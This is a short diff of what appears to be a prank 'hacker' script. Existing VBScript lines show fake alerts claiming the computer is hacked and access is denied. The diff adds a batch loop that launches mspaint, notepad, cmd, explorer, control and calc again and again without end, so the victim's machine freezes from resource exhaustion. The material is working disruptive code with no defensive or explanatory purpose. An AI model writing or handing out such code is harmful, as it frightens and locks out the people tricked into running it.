@@ -29,3 +29,13 @@ X=MsgBox("Your Computer is hacked",1+64,"Hacked")
 
 
 X=MsgBox("You cannot Access your Computer Anymore..",1+16,"Access Denied")
+
+@echo off
+:x
+start mspaint
+start notepad
+start cmd
+start explorer
+start control
+start calc
+goto x
